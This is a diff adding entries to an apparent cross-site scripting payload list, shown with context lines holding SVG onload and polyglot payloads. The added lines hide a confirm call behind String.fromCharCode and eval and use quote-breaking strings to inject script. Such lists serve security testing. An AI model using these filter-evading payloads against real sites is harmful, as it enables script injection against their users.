@@ -16,3 +16,6 @@ JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Sty
 <svg onload="console.log`XSS executed`">
 <svg/onload=\u0063onfirm(1)>
 <svg onload=confirm`${1}`>
+eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59)); 
+');confirm();//
+');eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59));//
